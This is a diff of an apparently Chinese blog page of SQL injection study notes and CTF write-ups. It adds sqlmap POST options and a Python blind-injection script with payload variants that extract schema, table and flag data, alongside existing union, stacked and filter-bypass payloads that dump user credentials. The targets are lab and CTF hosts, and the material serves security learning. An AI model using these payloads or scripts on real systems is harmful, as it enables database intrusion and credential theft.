@@ -393,14 +393,14 @@ desc xxx">
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2.7k
+                    3.2k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    12 分
+                    15 分
                 </div>
                 
 				
@@ -458,7 +458,7 @@ user(); //当前用户</code></pre>
 <a id="more"></a>
 <h3 id="二、sqlmap使用"><a href="#二、sqlmap使用" class="headerlink" title="二、sqlmap使用"></a>二、sqlmap使用</h3><p>github地址为<a href="https://github.com/sqlmapproject/sqlmap" target="_blank" rel="noopener">https://github.com/sqlmapproject/sqlmap</a>，功能参考书<a href="https://github.com/Kit4y/Sql-Injection/blob/master/Book/sqlmap%E6%95%99%E7%A8%8B.pdf" target="_blank" rel="noopener">https://github.com/Kit4y/Sql-Injection/blob/master/Book/sqlmap教程.pdf</a></p>
 <h4 id="一些常用使用命令"><a href="#一些常用使用命令" class="headerlink" title="一些常用使用命令"></a>一些常用使用命令</h4><h5 id="1、是否能注入"><a href="#1、是否能注入" class="headerlink" title="1、是否能注入"></a>1、是否能注入</h5><pre><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot;</code></pre><h5 id="2、获取所有的数据库"><a href="#2、获取所有的数据库" class="headerlink" title="2、获取所有的数据库"></a>2、获取所有的数据库</h5><pre><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; --dbs</code></pre><h5 id="3、当前库"><a href="#3、当前库" class="headerlink" title="3、当前库"></a>3、当前库</h5><pre><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; --current-db</code></pre><h5 id="4、查询某数据库的所有表（比如security）"><a href="#4、查询某数据库的所有表（比如security）" class="headerlink" title="4、查询某数据库的所有表（比如security）"></a>4、查询某数据库的所有表（比如security）</h5><pre><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot;  -D security --tables</code></pre><h5 id="5、暴力查询所有的表"><a href="#5、暴力查询所有的表" class="headerlink" title="5、暴力查询所有的表"></a>5、暴力查询所有的表</h5><pre><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot;   --tables</code></pre><h5 id="6、列出security库中users表中的所有列"><a href="#6、列出security库中users表中的所有列" class="headerlink" title="6、列出security库中users表中的所有列"></a>6、列出security库中users表中的所有列</h5><pre><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot;   -D security -T users --columns</code></pre><p>(-D dbname指定数据库名称、-T tablename：指定某数据表的名称、–columns：列出指定表上的所有列)</p>
-<h5 id="7、导出三个数据列中所有的数据"><a href="#7、导出三个数据列中所有的数据" class="headerlink" title="7、导出三个数据列中所有的数据"></a>7、导出三个数据列中所有的数据</h5><pre><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot;   -D security -T users -C id,username,password --dump</code></pre><h5 id="8、提供一个sql-shell"><a href="#8、提供一个sql-shell" class="headerlink" title="8、提供一个sql shell"></a>8、提供一个sql shell</h5><pre><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; --sql-shell</code></pre><h3 id="三、遗漏知识点"><a href="#三、遗漏知识点" class="headerlink" title="三、遗漏知识点"></a>三、遗漏知识点</h3><h4 id="3-1、MySql–三种注释写法"><a href="#3-1、MySql–三种注释写法" class="headerlink" title="3.1、MySql–三种注释写法"></a>3.1、MySql–三种注释写法</h4><h5 id="3-1-1、"><a href="#3-1-1、" class="headerlink" title="3.1.1、--"></a>3.1.1、<code>--</code></h5><p>后面一定要加空格</p>
+<h5 id="7、导出三个数据列中所有的数据"><a href="#7、导出三个数据列中所有的数据" class="headerlink" title="7、导出三个数据列中所有的数据"></a>7、导出三个数据列中所有的数据</h5><pre><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot;   -D security -T users -C id,username,password --dump</code></pre><h5 id="8、提供一个sql-shell"><a href="#8、提供一个sql-shell" class="headerlink" title="8、提供一个sql shell"></a>8、提供一个sql shell</h5><pre><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; --sql-shell</code></pre><h5 id="9、post"><a href="#9、post" class="headerlink" title="9、post"></a>9、post</h5><pre><code>python sqlmap.py -u 登录的地址 --data &quot;userid=aaa&amp;passwd=bbbb&quot;</code></pre><h5 id="10、添加前缀"><a href="#10、添加前缀" class="headerlink" title="10、添加前缀"></a>10、添加前缀</h5><pre><code>--prefix=&quot;%1$\&#39;&quot; -p username</code></pre><h3 id="三、遗漏知识点"><a href="#三、遗漏知识点" class="headerlink" title="三、遗漏知识点"></a>三、遗漏知识点</h3><h4 id="3-1、MySql–三种注释写法"><a href="#3-1、MySql–三种注释写法" class="headerlink" title="3.1、MySql–三种注释写法"></a>3.1、MySql–三种注释写法</h4><h5 id="3-1-1、"><a href="#3-1-1、" class="headerlink" title="3.1.1、--"></a>3.1.1、<code>--</code></h5><p>后面一定要加空格</p>
 <h5 id="3-1-2、"><a href="#3-1-2、" class="headerlink" title="3.1.2、#"></a>3.1.2、<code>#</code></h5><h5 id="3-1-3、"><a href="#3-1-3、" class="headerlink" title="3.1.3、/**/"></a>3.1.3、<code>/**/</code></h5><h4 id="3-2、注入尾部为什么是-而不是"><a href="#3-2、注入尾部为什么是-而不是" class="headerlink" title="3.2、注入尾部为什么是--+而不是--"></a>3.2、注入尾部为什么是<code>--+</code>而不是<code>--</code></h4><p>这里字符-和字符+在URL中都是有固定的含义的 , 比如说+就在URL编码中就代表空格 , 而URL编码中-不用编码。我们也可以不用+ 而使用空格的URL编码 , 那么编码得到的URL就应该是 :</p>
 <pre><code>id=1%27--%20</code></pre><h4 id="3-3、-又为什么必须得编码-不编码可以吗"><a href="#3-3、-又为什么必须得编码-不编码可以吗" class="headerlink" title="3.3、#又为什么必须得编码 , 不编码可以吗 ?"></a>3.3、<code>#</code>又为什么必须得编码 , 不编码可以吗 ?</h4><p>不可以 , 因为# 在URL中是有固定的含义的 , 表示页面中的锚点 , 如果不进行编码浏览器就会将其当成页面的锚点 , 而这里我们是需要将其作为数据传输给服务器的 , 因此需要进行URL编码</p>
 <h3 id="四、补充mysql的一些函数"><a href="#四、补充mysql的一些函数" class="headerlink" title="四、补充mysql的一些函数"></a>四、补充mysql的一些函数</h3><h4 id="4-1、substr"><a href="#4-1、substr" class="headerlink" title="4.1、substr()"></a>4.1、substr()</h4><p>substr()函数是用来截取数据库某一列字段中的一部分<br>常用的方式是： </p>
@@ -528,10 +528,10 @@ FROM Websites;</code></pre><p>返回结果<br><img src="13.png" alt=""></p>
 | name3 | 男  |
 | name4 | 女  |
 +-------+-----+
-rows in set (0.00 sec)</code></pre><h3 id="五、题目经典payload"><a href="#五、题目经典payload" class="headerlink" title="五、题目经典payload"></a>五、题目经典payload</h3><pre><code>-1&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata%23
+rows in set (0.00 sec)</code></pre><h4 id="五、题目经典payload"><a href="#五、题目经典payload" class="headerlink" title="五、题目经典payload"></a>五、题目经典payload</h4><pre><code>-1&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata%23
 -1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema= &#39;security&#39;%23
 -1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name= &#39;users&#39;%23
--1&#39; union select 1,group_concat(username),group_concat(password) from users%23</code></pre><h5 id="“百度杯”CTF比赛-九月场SQLi-过滤了逗号"><a href="#“百度杯”CTF比赛-九月场SQLi-过滤了逗号" class="headerlink" title="“百度杯”CTF比赛 九月场SQLi-过滤了逗号"></a>“百度杯”CTF比赛 九月场SQLi-过滤了逗号</h5><pre><code>id=1&#39; union select * from (select database()) a join (select version() ) b %23</code></pre><h4 id="过滤了空格，逗号，等号，for，and等的盲注，使用-mid函数骚操作"><a href="#过滤了空格，逗号，等号，for，and等的盲注，使用-mid函数骚操作" class="headerlink" title="过滤了空格，逗号，等号，for，and等的盲注，使用^mid函数骚操作"></a>过滤了空格，逗号，等号，for，and等的盲注，使用^mid函数骚操作</h4><p>空格用括号代替，等号用&lt;&gt;(一种不等号)代替<br>异或运算^代替and</p>
+-1&#39; union select 1,group_concat(username),group_concat(password) from users%23</code></pre><h4 id="“百度杯”CTF比赛-九月场SQLi-过滤了逗号"><a href="#“百度杯”CTF比赛-九月场SQLi-过滤了逗号" class="headerlink" title="“百度杯”CTF比赛 九月场SQLi-过滤了逗号"></a>“百度杯”CTF比赛 九月场SQLi-过滤了逗号</h4><pre><code>id=1&#39; union select * from (select database()) a join (select version() ) b %23</code></pre><h4 id="过滤了空格，逗号，等号，for，and等的盲注，使用-mid函数骚操作"><a href="#过滤了空格，逗号，等号，for，and等的盲注，使用-mid函数骚操作" class="headerlink" title="过滤了空格，逗号，等号，for，and等的盲注，使用^mid函数骚操作"></a>过滤了空格，逗号，等号，for，and等的盲注，使用^mid函数骚操作</h4><p>空格用括号代替，等号用&lt;&gt;(一种不等号)代替<br>异或运算^代替and</p>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
 str_all<span class="token operator">=</span><span class="token string">"1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ {}+-*/="</span>
 url<span class="token operator">=</span><span class="token string">"http://123.206.31.85:49167/index.php"</span>
@@ -584,6 +584,129 @@ password<span class="token punctuation">(</span><span class="token punctuation">
 <p>(翻博客发现数字串为表名的表操作时要加反引号，加上之后发现的确有flag字段)<br>理论上我们执行<br><code>0&#39;;select flag,1 from 1919810931114514</code><br>但是这题的select被过滤了<br><code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code><br>也可以<br><code>-1&#39;;use supersqli;show tables;--</code><br>直接获取flag<br><code>1&#39;;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#</code><br>其中<code>73656c656374202a2066726f6d20603139313938313039333131313435313460</code>加密为select * from `1919810931114514’<br>相关知识</p>
 <pre><code>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</code></pre><p>还有骚操作是改表段然后注入获得数据</p>
 <pre><code>0&#39;;set @s=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(102),char(108),char(97),char(103),char(32),char(102),char(114),char(111),char(109),char(32),char(96),char(49),char(57),char(49),char(57),char(56),char(49),char(48),char(57),char(51),char(49),char(49),char(49),char(52),char(53),char(49),char(52),char(96));PREPARE a FROM @s;EXECUTE a;</code></pre><h4 id="“百度杯”CTF比赛-九月场-SQL"><a href="#“百度杯”CTF比赛-九月场-SQL" class="headerlink" title="“百度杯”CTF比赛 九月场 SQL"></a>“百度杯”CTF比赛 九月场 SQL</h4><p>题目描述：<br><code>出题人就告诉你这是个注入，有种别走！</code><br><code>http://2733aeef10c94e969b49b24dd9e8a99bbdd989b14f4e482e.changame.ichunqiu.com/index.php?id=1 union se&lt;&gt;lect 1,4,3</code>，学到了学到了&lt;&gt;分离<br><code>http://2733aeef10c94e969b49b24dd9e8a99bbdd989b14f4e482e.changame.ichunqiu.com/index.php?id=1 union se&lt;&gt;lect 1,database(),3</code><br>获得数据库名字sqli然后一步一步<br><code>http://2733aeef10c94e969b49b24dd9e8a99bbdd989b14f4e482e.changame.ichunqiu.com/index.php?id=1 union se&lt;&gt;lect 1,column_name,3 from information_schema.columns where table_schema=&#39;sqli&#39; an&lt;&gt;d table_name=&#39;info&#39;</code><br><code>http://2733aeef10c94e969b49b24dd9e8a99bbdd989b14f4e482e.changame.ichunqiu.com/index.php?id=1 union se&lt;&gt;lect 1,flAg_T5ZNdrm,3 from info</code><br>得到flag</p>
+<h4 id="盲注模板“迎圣诞，拿大奖”活动赛题sqli"><a href="#盲注模板“迎圣诞，拿大奖”活动赛题sqli" class="headerlink" title="盲注模板“迎圣诞，拿大奖”活动赛题sqli"></a>盲注模板“迎圣诞，拿大奖”活动赛题sqli</h4><p>模板</p>
+<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
+<span class="token comment" spellcheck="true"># encoding:utf8</span>
+
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> time
+<span class="token keyword">import</span> sys
+
+<span class="token comment" spellcheck="true"># config-start</span>
+sleep_time <span class="token operator">=</span> <span class="token number">5</span>
+error_time <span class="token operator">=</span> <span class="token number">1</span>
+<span class="token comment" spellcheck="true"># config-end</span>
+
+<span class="token keyword">def</span> <span class="token function">getPayload</span><span class="token punctuation">(</span>indexOfResult<span class="token punctuation">,</span> indexOfChar<span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    column_name<span class="token operator">=</span><span class="token string">"column_name"</span>
+    table_name<span class="token operator">=</span><span class="token string">"columns"</span>
+    database_name<span class="token operator">=</span><span class="token string">"information_schema"</span>
+    startStr <span class="token operator">=</span> <span class="token string">"admin%1$\\' or "</span>
+    endStr <span class="token operator">=</span> <span class="token string">" #"</span>
+    payload <span class="token operator">=</span> <span class="token string">"((ascii(substring((select "</span> <span class="token operator">+</span> column_name <span class="token operator">+</span> <span class="token string">" from "</span> <span class="token operator">+</span> database_name <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> table_name <span class="token operator">+</span> <span class="token string">" where table_name=0x666c6167 limit "</span> <span class="token operator">+</span> indexOfResult <span class="token operator">+</span> <span class="token string">",1 ),"</span> <span class="token operator">+</span> indexOfChar <span class="token operator">+</span> <span class="token string">",1)))>"</span> <span class="token operator">+</span> mid <span class="token operator">+</span> <span class="token string">")"</span>
+    payload <span class="token operator">=</span> startStr <span class="token operator">+</span> payload <span class="token operator">+</span> endStr
+    <span class="token keyword">return</span> payload
+
+<span class="token keyword">def</span> <span class="token function">exce</span><span class="token punctuation">(</span>indexOfResult<span class="token punctuation">,</span>indexOfChar<span class="token punctuation">,</span>mid<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment" spellcheck="true"># content-start</span>
+    url <span class="token operator">=</span> <span class="token string">"http://3ce3bb7f26364585b8d7970ae179fe54857ddd7277964f32.changame.ichunqiu.com/"</span>
+    post_data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span>getPayload<span class="token punctuation">(</span>indexOfResult<span class="token punctuation">,</span>indexOfChar<span class="token punctuation">,</span>mid<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"123"</span><span class="token punctuation">}</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>post_data<span class="token punctuation">)</span>
+    content <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>post_data<span class="token punctuation">)</span>
+    content<span class="token punctuation">.</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span>
+    content<span class="token operator">=</span>content<span class="token punctuation">.</span>text
+    <span class="token comment" spellcheck="true">#print(content)</span>
+    <span class="token comment" spellcheck="true"># content-end</span>
+    <span class="token comment" spellcheck="true"># judge-start</span>
+    <span class="token keyword">if</span> <span class="token string">"password error!"</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token boolean">True</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token boolean">False</span>
+    <span class="token comment" spellcheck="true"># judge-end</span>
+<span class="token keyword">def</span> <span class="token function">exceGet</span><span class="token punctuation">(</span>indexOfResult<span class="token punctuation">,</span>indexOfChar<span class="token punctuation">,</span>mid<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment" spellcheck="true"># content-start</span>
+    url <span class="token operator">=</span> <span class="token string">"http://localhost/sqli-labs-master/Less-5/?id="</span>
+    tempurl <span class="token operator">=</span> url <span class="token operator">+</span> getPayload<span class="token punctuation">(</span>indexOfResult<span class="token punctuation">,</span>indexOfChar<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>
+    content <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>tempurl<span class="token punctuation">)</span><span class="token punctuation">.</span>text
+    <span class="token comment" spellcheck="true"># content-end</span>
+    <span class="token comment" spellcheck="true"># judge-start</span>
+    <span class="token keyword">if</span> <span class="token string">"You are in..........."</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token boolean">True</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token boolean">False</span>
+    <span class="token comment" spellcheck="true"># judge-end</span>
+
+<span class="token keyword">def</span> <span class="token function">doubleSearch</span><span class="token punctuation">(</span>indexOfResult<span class="token punctuation">,</span>indexOfChar<span class="token punctuation">,</span>left_number<span class="token punctuation">,</span> right_number<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">while</span> left_number <span class="token operator">&lt;</span> right_number<span class="token punctuation">:</span>
+        mid <span class="token operator">=</span> int<span class="token punctuation">(</span><span class="token punctuation">(</span>left_number <span class="token operator">+</span> right_number<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> exce<span class="token punctuation">(</span>str<span class="token punctuation">(</span>indexOfResult<span class="token punctuation">)</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>indexOfChar <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            left_number <span class="token operator">=</span> mid
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            right_number <span class="token operator">=</span> mid
+        <span class="token keyword">if</span> left_number <span class="token operator">==</span> right_number <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">:</span>
+            <span class="token keyword">if</span> exce<span class="token punctuation">(</span>str<span class="token punctuation">(</span>indexOfResult<span class="token punctuation">)</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>indexOfChar <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                mid <span class="token operator">+=</span> <span class="token number">1</span>
+                <span class="token keyword">break</span>
+            <span class="token keyword">else</span><span class="token punctuation">:</span>
+                <span class="token keyword">break</span>
+    <span class="token keyword">return</span> chr<span class="token punctuation">(</span>mid<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">search</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># 需要遍历的查询结果的数量</span>
+        counter <span class="token operator">=</span> <span class="token number">0</span>
+        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># 结果的长度</span>
+            counter <span class="token operator">+=</span> <span class="token number">1</span>
+            temp <span class="token operator">=</span> doubleSearch<span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 从255开始查询</span>
+            <span class="token keyword">if</span> ord<span class="token punctuation">(</span>temp<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># 当为1的时候说明已经查询结束</span>
+                <span class="token keyword">break</span>
+            sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span>temp<span class="token punctuation">)</span>
+            sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> counter <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># 当结果集的所有行都被遍历后退出</span>
+            <span class="token keyword">break</span>
+        sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"\r\n"</span><span class="token punctuation">)</span>
+        sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+search<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p>获得库ctf</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">getPayload</span><span class="token punctuation">(</span>indexOfResult<span class="token punctuation">,</span> indexOfChar<span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    column_name<span class="token operator">=</span><span class="token string">"schema_name"</span>
+    table_name<span class="token operator">=</span><span class="token string">"schemata"</span>
+    database_name<span class="token operator">=</span><span class="token string">"information_schema"</span>
+    startStr <span class="token operator">=</span> <span class="token string">"admin%1$\\' or "</span>
+    endStr <span class="token operator">=</span> <span class="token string">" #"</span>
+    payload <span class="token operator">=</span> <span class="token string">"((ascii(substring((select "</span> <span class="token operator">+</span> column_name <span class="token operator">+</span> <span class="token string">" from "</span> <span class="token operator">+</span> database_name <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> table_name <span class="token operator">+</span> <span class="token string">"  limit "</span> <span class="token operator">+</span> indexOfResult <span class="token operator">+</span> <span class="token string">",1),"</span> <span class="token operator">+</span> indexOfChar <span class="token operator">+</span> <span class="token string">",1)))>"</span> <span class="token operator">+</span> mid <span class="token operator">+</span> <span class="token string">")"</span>
+    payload <span class="token operator">=</span> startStr <span class="token operator">+</span> payload <span class="token operator">+</span> endStr
+    <span class="token keyword">return</span> payload</code></pre>
+<p>获得表名flag</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">getPayload</span><span class="token punctuation">(</span>indexOfResult<span class="token punctuation">,</span> indexOfChar<span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    column_name<span class="token operator">=</span><span class="token string">"table_name"</span>
+    table_name<span class="token operator">=</span><span class="token string">"tables"</span>
+    database_name<span class="token operator">=</span><span class="token string">"information_schema"</span>
+    startStr <span class="token operator">=</span> <span class="token string">"admin%1$\\' or "</span>
+    endStr <span class="token operator">=</span> <span class="token string">" #"</span>
+    payload <span class="token operator">=</span> <span class="token string">"((ascii(substring((select "</span> <span class="token operator">+</span> column_name <span class="token operator">+</span> <span class="token string">" from "</span> <span class="token operator">+</span> database_name <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> table_name <span class="token operator">+</span> <span class="token string">" where table_schema=database()  limit "</span> <span class="token operator">+</span> indexOfResult <span class="token operator">+</span> <span class="token string">",1 ),"</span> <span class="token operator">+</span> indexOfChar <span class="token operator">+</span> <span class="token string">",1)))>"</span> <span class="token operator">+</span> mid <span class="token operator">+</span> <span class="token string">")"</span>
+    payload <span class="token operator">=</span> startStr <span class="token operator">+</span> payload <span class="token operator">+</span> endStr
+    <span class="token keyword">return</span> payload</code></pre>
+<p>获得字段flag</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">getPayload</span><span class="token punctuation">(</span>indexOfResult<span class="token punctuation">,</span> indexOfChar<span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    column_name<span class="token operator">=</span><span class="token string">"table_name"</span>
+    table_name<span class="token operator">=</span><span class="token string">"tables"</span>
+    database_name<span class="token operator">=</span><span class="token string">"information_schema"</span>
+    startStr <span class="token operator">=</span> <span class="token string">"admin%1$\\' or "</span>
+    endStr <span class="token operator">=</span> <span class="token string">" #"</span>
+    payload <span class="token operator">=</span> <span class="token string">"((ascii(substring((select "</span> <span class="token operator">+</span> column_name <span class="token operator">+</span> <span class="token string">" from "</span> <span class="token operator">+</span> database_name <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> table_name <span class="token operator">+</span> <span class="token string">" where table_name = 0x666c6167 limit "</span> <span class="token operator">+</span> indexOfResult <span class="token operator">+</span> <span class="token string">",1 ),"</span> <span class="token operator">+</span> indexOfChar <span class="token operator">+</span> <span class="token string">",1)))>"</span> <span class="token operator">+</span> mid <span class="token operator">+</span> <span class="token string">")"</span>
+    payload <span class="token operator">=</span> startStr <span class="token operator">+</span> payload <span class="token operator">+</span> endStr
+    <span class="token keyword">return</span> payload</code></pre>
+<p>获得数据</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">getPayload</span><span class="token punctuation">(</span>indexOfResult<span class="token punctuation">,</span> indexOfChar<span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    column_name<span class="token operator">=</span><span class="token string">"flag"</span>
+    table_name<span class="token operator">=</span><span class="token string">"columns"</span>
+    database_name<span class="token operator">=</span><span class="token string">"flag"</span>
+    startStr <span class="token operator">=</span> <span class="token string">"admin%1$\\' or "</span>
+    endStr <span class="token operator">=</span> <span class="token string">" #"</span>
+    payload <span class="token operator">=</span> <span class="token string">"((ascii(substring((select "</span> <span class="token operator">+</span> column_name <span class="token operator">+</span> <span class="token string">" from "</span> <span class="token operator">+</span> database_name <span class="token operator">+</span> <span class="token string">" limit "</span> <span class="token operator">+</span> indexOfResult <span class="token operator">+</span> <span class="token string">",1 ),"</span> <span class="token operator">+</span> indexOfChar <span class="token operator">+</span> <span class="token string">",1)))>"</span> <span class="token operator">+</span> mid <span class="token operator">+</span> <span class="token string">")"</span>
+    payload <span class="token operator">=</span> startStr <span class="token operator">+</span> payload <span class="token operator">+</span> endStr
+    <span class="token keyword">return</span> payload</code></pre>
 
             </div>
             <hr/>
@@ -932,7 +1055,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">148k</span>&nbsp;字
+                class="white-color">148.5k</span>&nbsp;字
             
             
             
